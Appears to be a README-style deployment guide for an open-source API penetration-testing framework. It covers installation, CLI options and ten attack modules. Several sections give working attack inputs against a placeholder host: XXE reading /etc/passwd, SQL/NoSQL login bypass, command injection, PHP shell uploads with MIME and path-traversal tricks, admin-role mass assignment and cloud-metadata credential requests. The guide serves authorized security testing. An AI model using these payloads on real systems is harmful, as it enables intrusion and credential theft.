# 🚀 Deployment Guide — API Penetration Testing Framework

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Installation](#installation)
3. [Verify Installation](#verify-installation)
4. [Usage Commands](#usage-commands)
5. [How It Works](#how-it-works)
6. [Attack Modules Explained](#attack-modules-explained)
7. [Output & Reports](#output--reports)
8. [Advanced Usage](#advanced-usage)
9. [Troubleshooting](#troubleshooting)

---

## Prerequisites

| Requirement | Minimum Version | Notes |
|-------------|-----------------|-------|
| Python | 3.7+ | `python3 --version` |
| pip | Latest | `pip3 --version` |
| Bash | Any | For `install_dependencies.sh` |
| OS | Linux / macOS / Windows (WSL) | Full tool support on Linux |

---

## Installation

### Step 1 — Clone / Navigate to the Project

```bash
git clone https://github.com/lysophavin18/API-Hacking.git
cd API-Hacking
```

### Step 2 — Install Python Dependencies

```bash
pip3 install -r requirements.txt
```

This installs the core Python libraries:

| Package | Purpose |
|---------|---------|
| `requests` | HTTP request execution |
| `pyjwt` | JWT token encode/decode/analysis |
| `cryptography` | Cryptographic operations for token tests |
| `pyyaml` | YAML configuration parsing |
| `urllib3` | Low-level HTTP support |

### Step 3 — Install System Tools (Recommended)

```bash
bash install_dependencies.sh
```

Installs 40+ external tools including `ffuf`, `sqlmap`, `mitmproxy`, `curl`, `httpie`, `gobuster`, `nmap`, `locust`, and more.  
All installations are non-fatal — missing optional tools will not prevent the Python framework from running.

### Step 4 — Verify Setup

```bash
python3 test_installation.py
```

Expected output:
```
========================================
API Pentest Framework - Installation Test
========================================

[*] Testing Python imports...
  [+] requests - OK
  [+] PyJWT - OK
  [+] cryptography - OK
  [+] PyYAML - OK
  [+] urllib3 - OK

[*] Testing module structure...
  [+] modules.discovery_enumeration - OK
  [+] modules.authentication_attacks - OK
  ...

[+] Installation complete and ready to use!
```

---

## Usage Commands

### Basic Scan

```bash
# Run a complete 10-category API penetration test
python3 api_pentest_orchestrator.py http://api.target.com
```

### With Authentication Token

```bash
# Pass a Bearer token for authenticated endpoint testing
python3 api_pentest_orchestrator.py http://api.target.com --token YOUR_TOKEN

# Short form
python3 api_pentest_orchestrator.py http://api.target.com -t eyJ0eXAiOiJKV1QiLC...
```

### Custom Output Directory

```bash
# Save results to a specific folder
python3 api_pentest_orchestrator.py http://api.target.com --output ./my_results

# Short form
python3 api_pentest_orchestrator.py http://api.target.com -o ./pentest_2024
```

### Verbose Mode

```bash
# Enable DEBUG-level logging for detailed output
python3 api_pentest_orchestrator.py http://api.target.com --verbose

# Short form
python3 api_pentest_orchestrator.py http://api.target.com -v
```

### Combine All Options

```bash
python3 api_pentest_orchestrator.py https://api.target.com \
  --token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... \
  --output ./results_$(date +%Y%m%d_%H%M%S) \
  --verbose
```

### Help

```bash
python3 api_pentest_orchestrator.py --help
```

Output:
```
usage: api_pentest_orchestrator.py [-h] [--token TOKEN] [--output OUTPUT] [--verbose] url

API Penetration Testing Framework

positional arguments:
  url                   Target API URL

optional arguments:
  -h, --help            show this help message and exit
  --token TOKEN, -t     Authentication token
  --output OUTPUT, -o   Output directory (default: results)
  --verbose, -v         Verbose output
```

---

## How It Works

### Execution Flow

```
User runs: python3 api_pentest_orchestrator.py http://api.target.com
                              │
                    ┌─────────▼──────────┐
                    │  Parse CLI args    │  (url, token, output, verbose)
                    └─────────┬──────────┘
                              │
                    ┌─────────▼──────────┐
                    │  APIPentest        │
                    │  Orchestrator      │  Creates output directory
                    └─────────┬──────────┘
                              │
                    ┌─────────▼──────────┐
                    │  AutoPentest       │
                    │  run_full_scan()   │  Runs 10 attack phases
                    └─────────┬──────────┘
                              │
          ┌───────────────────┼──────────── ... ────────────────────┐
          │                   │                                      │
   Phase 1: Discovery  Phase 2: Auth     ...       Phase 10: Secrets
          │                   │                                      │
          └───────────────────┼──────────── ... ────────────────────┘
                              │
                    ┌─────────▼──────────┐
                    │  generate_report() │  OWASP mapping + risk scoring
                    └─────────┬──────────┘
                              │
                    ┌─────────▼──────────┐
                    │  Save Output       │  3 files written to disk
                    └─────────┬──────────┘
                              │
                    ┌─────────▼──────────┐
                    │  Print Summary     │  Risk level + vuln count
                    └────────────────────┘
```

### Component Roles

| Component | File | Role |
|-----------|------|------|
| **CLI Entry Point** | `api_pentest_orchestrator.py` | Parses arguments, wires everything together, saves output |
| **Workflow Engine** | `workflows/auto_pentest.py` | Runs 10 attack phases sequentially, generates report |
| **Attack Modules** | `modules/*.py` | Each module owns one OWASP category, implements `analyze()` |
| **Request Builder** | `utils/request_builder.py` | Executes HTTP requests, generates payloads, parses results |

### Request Pipeline

Every module test follows the same three-step pattern:

```
1. Craft payload      →  PayloadGenerator.sql_injection_payloads()
2. Send request       →  RequestBuilder.build_request(method, endpoint, ...)
3. Check indicators   →  ResultParser.check_vulnerability_indicators(response)
```

Indicators checked:
- HTTP status codes (200, 201, 403, 500 …)
- Error keywords in response body (`syntax error`, `ORA-`, `$ne`, …)
- Response timing (for timing-based attacks)
- Unexpected data fields in JSON responses
- Sensitive header exposure

### Risk Scoring

After all phases complete, `AutoPentest.generate_report()` calculates:

```
Vulnerabilities found   →  Risk Level
─────────────────────────────────────
7 or more               →  CRITICAL
5 – 6                   →  HIGH
2 – 4                   →  MEDIUM
0 – 1                   →  LOW
```

---

## Attack Modules Explained

### Phase 1 — Discovery & Enumeration (`modules/discovery_enumeration.py`)

**What it does:**  
Maps the attack surface before any exploitation begins.

**Techniques:**
- Endpoint fuzzing via `ffuf` against common paths (`/api/users`, `/v1/`, `/swagger.json` …)
- HTTP method enumeration (`OPTIONS`, `TRACE`, `PUT`, `DELETE`)
- Version path detection (`/v1/`, `/v2/`, `/api/v3/`)
- Swagger / OpenAPI spec extraction

**Quick manual test:**
```bash
ffuf -u http://api.target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
curl -X OPTIONS http://api.target.com/api/users -v
curl http://api.target.com/swagger.json
```

---

### Phase 2 — Authentication Attacks (`modules/authentication_attacks.py`)

**What it does:**  
Finds weaknesses in how the API authenticates callers.

**Techniques:**
- JWT `none` algorithm bypass
- Weak JWT secret brute-force (`secret`, `password`, `123456`)
- Token replay / expired-token reuse
- Hardcoded API key scanning in responses
- OAuth misconfiguration detection
- Login bypass via crafted payloads

**Quick manual test:**
```bash
# Decode JWT
echo "YOUR.JWT.TOKEN" | cut -d. -f2 | base64 -d

# None algorithm
# Manually craft header: {"alg":"none","typ":"JWT"} and remove signature

# Weak secret
python3 -c "import jwt; print(jwt.decode('TOKEN', 'secret', algorithms=['HS256']))"
```

---

### Phase 3 — Authorization Attacks / BOLA / BFLA (`modules/authorization_attacks.py`)

**What it does:**  
Tests whether the API enforces proper object-level and function-level access control.

**Techniques:**
- IDOR (Insecure Direct Object Reference) — iterate over numeric IDs
- Horizontal privilege escalation — access another user's objects
- Vertical privilege escalation — access admin endpoints as regular user
- HTTP method override (`X-HTTP-Method-Override: DELETE`)
- Parameter pollution (`?id=1&id=2`)
- Role manipulation in JWT payload

**Quick manual test:**
```bash
# IDOR
curl -H "Authorization: Bearer USER_TOKEN" http://api.target.com/api/users/1
curl -H "Authorization: Bearer USER_TOKEN" http://api.target.com/api/users/2

# Admin endpoint
curl -H "Authorization: Bearer USER_TOKEN" http://api.target.com/api/admin/users
```

---

### Phase 4 — Injection Attacks (`modules/injection_attacks.py`)

**What it does:**  
Injects malicious data into API parameters to exploit server-side parsing.

**Techniques:**
- SQL injection in JSON body and query parameters
- NoSQL injection (`{"$ne": null}`, `{"$gt": ""}`)
- OS command injection (`; id`, `| whoami`)
- XPath/XML injection
- LDAP injection
- XXE (XML External Entity) injection

**Quick manual test:**
```bash
# SQL injection
curl "http://api.target.com/search?q=1' OR '1'='1"

# NoSQL injection
curl -X POST http://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# XXE
curl -X POST http://api.target.com/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

---

### Phase 5 — Business Logic Attacks (`modules/business_logic_attacks.py`)

**What it does:**  
Exploits flaws in the application's intended workflows rather than technical bugs.

**Techniques:**
- Payment amount manipulation (`"amount": 0`, `"amount": -1`)
- Coupon / discount abuse (apply same coupon multiple times)
- Race conditions (concurrent requests to claim a resource)
- Quantity manipulation (negative quantities)
- Workflow bypass (skip steps in multi-step processes)
- Parameter type confusion (string vs integer)

**Quick manual test:**
```bash
# Payment bypass
curl -X POST http://api.target.com/checkout \
  -H "Content-Type: application/json" \
  -d '{"amount":0,"currency":"USD"}'

# Race condition (50 concurrent requests)
ab -n 100 -c 50 -X POST http://api.target.com/api/claim
```

---

### Phase 6 — Mass Assignment (`modules/mass_assignment.py`)

**What it does:**  
Injects hidden or privileged fields into request bodies that the API blindly binds to objects.

**Techniques:**
- Admin role injection (`"isAdmin": true`, `"role": "admin"`)
- Hidden field discovery
- Premium / subscription injection
- Financial field tampering (`"balance": 99999`)
- Metadata injection (`"createdAt"`, `"updatedAt"`)

**Quick manual test:**
```bash
curl -X POST http://api.target.com/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","isAdmin":true,"role":"admin"}'
```

---

### Phase 7 — Rate Limiting & DoS (`modules/rate_limiting_dos.py`)

**What it does:**  
Tests whether the API enforces limits on request frequency and resource consumption.

**Techniques:**
- Header-based rate limit bypass (`X-Forwarded-For`, `X-Real-IP`)
- OTP brute-force (6-digit codes)
- Password brute-force on login endpoint
- API resource exhaustion (large payloads)
- High-concurrency request flooding

**Quick manual test:**
```bash
# Rate limit bypass loop
for i in {1..100}; do
  curl -H "X-Forwarded-For: $i.0.0.0" http://api.target.com/api/data
done

# Load test
ab -n 1000 -c 50 http://api.target.com/api/data
```

---

### Phase 8 — GraphQL Attacks (`modules/graphql_attacks.py`)

**What it does:**  
Exploits GraphQL-specific vulnerabilities to extract schema information, bypass auth, or cause DoS.

**Techniques:**
- Introspection queries to dump the full schema
- Field enumeration (guess sensitive fields like `password`, `ssn`)
- Query complexity DoS (deeply nested queries)
- Authorization bypass via direct field access
- Fragment injection

**Quick manual test:**
```bash
# Introspection
curl -X POST http://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name fields{name}}}}"}'

# Sensitive field access
curl -X POST http://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user{id email password ssn}}"}'
```

---

### Phase 9 — File Upload & Deserialization (`modules/file_upload_deserialization.py`)

**What it does:**  
Tests whether the API safely handles file uploads and deserialized objects.

**Techniques:**
- Unrestricted file upload (`.php`, `.jsp`, `.py` shells)
- MIME type bypass (`Content-Type: image/jpeg` for PHP files)
- Path traversal in filename (`../../../etc/cron.d/shell`)
- Double extension bypass (`shell.php.jpg`)
- Null-byte injection (`shell.php%00.jpg`)
- Insecure deserialization payloads

**Quick manual test:**
```bash
# File upload
curl -F "file=@shell.php" http://api.target.com/upload

# MIME bypass
curl -F "file=@shell.php;type=image/jpeg" http://api.target.com/upload

# Path traversal
curl -F "file=@shell.php" -F "path=../../webroot/" http://api.target.com/upload
```

---

### Phase 10 — Secrets & Token Abuse (`modules/secrets_token_abuse.py`)

**What it does:**  
Scans for exposed credentials, API keys, cloud secrets, and tests token privilege escalation.

**Techniques:**
- API key pattern scanning in responses (`AKIA`, `ghp_`, `sk_live_`)
- Hardcoded secret detection in API responses
- Token reuse after logout
- Weak signing key detection
- Cloud credential endpoint probing (`/aws/credentials`, `/gcp-credentials.json`)
- Token privilege escalation (modify claims, re-sign)
- Token logging exposure check

**Quick manual test:**
```bash
# Scan response for secrets
curl http://api.target.com/config | grep -E 'AKIA|ghp_|sk_live_|password|secret'

# Cloud metadata endpoints
curl http://api.target.com/aws/credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Token reuse after logout
curl -H "Authorization: Bearer OLD_TOKEN" http://api.target.com/api/profile
```

---

## Output & Reports

After a scan completes, three files are written to the output directory (`results/` by default):

### `pentest_results.json`
Full raw results from every test method across all 10 modules.

```bash
cat results/pentest_results.json | python3 -m json.tool
```

### `pentest_report.json`
Structured vulnerability report with OWASP mapping and recommendations.

```bash
# Show summary
cat results/pentest_report.json | python3 -c "
import json,sys
r=json.load(sys.stdin)
print('Risk Level:', r['summary']['risk_level'])
print('Total Vulns:', r['summary']['total_vulnerabilities'])
"
```

### `pentest_summary.md`
Human-readable executive summary with vulnerability list and remediation advice.

```bash
cat results/pentest_summary.md
```

---

## Advanced Usage

### Run a Single Attack Category

```python
# Authentication attacks only
from modules.authentication_attacks import AuthenticationAttackAnalyzer

analyzer = AuthenticationAttackAnalyzer("http://api.target.com", token="YOUR_TOKEN")
results = analyzer.analyze()
print(results)
```

### Run from Python Code

```python
from workflows.auto_pentest import AutoPentest

pentest = AutoPentest("http://api.target.com", token="your_token")
results = pentest.run_full_scan()
report = pentest.generate_report()
```

### Generate Payloads Only

```python
from utils.request_builder import PayloadGenerator

# Available payload sets
sql_payloads    = PayloadGenerator.sql_injection_payloads()
nosql_payloads  = PayloadGenerator.nosql_injection_payloads()
cmd_payloads    = PayloadGenerator.command_injection_payloads()
auth_payloads   = PayloadGenerator.authentication_bypass_payloads()
jwt_payloads    = PayloadGenerator.jwt_payloads()
xxe_payloads    = PayloadGenerator.xxe_payloads()
mass_payloads   = PayloadGenerator.mass_assignment_payloads()
```

### Timestamped Results per Run

```bash
python3 api_pentest_orchestrator.py http://api.target.com \
  -o ./results_$(date +%Y%m%d_%H%M%S)
```

---

## Troubleshooting

### SSL Certificate Errors

```bash
# The framework handles SSL internally; for curl manual tests use -k
curl -k https://api.target.com/api/users
```

### Module Import Errors

```bash
# Ensure you are running from the project root
cd /path/to/API-Hacking
python3 api_pentest_orchestrator.py http://target.com
```

### Missing Python Packages

```bash
pip3 install -r requirements.txt --upgrade
```

### Missing System Tools

```bash
bash install_dependencies.sh
```

### Permission Denied on Script

```bash
chmod +x install_dependencies.sh
bash install_dependencies.sh
```

### Verbose Debugging

```bash
python3 api_pentest_orchestrator.py http://target.com -v 2>&1 | tee debug.log
```

---

## ⚠️ Legal Disclaimer

This framework is for **authorized security testing only**.  
- Only test APIs you own or have **explicit written permission** to test.  
- Unauthorized testing is illegal in most jurisdictions.  
- Follow all applicable laws, regulations, and responsible disclosure policies.

---

**Start your first scan:**

```bash
python3 api_pentest_orchestrator.py http://your-api.com --token YOUR_TOKEN -v
```
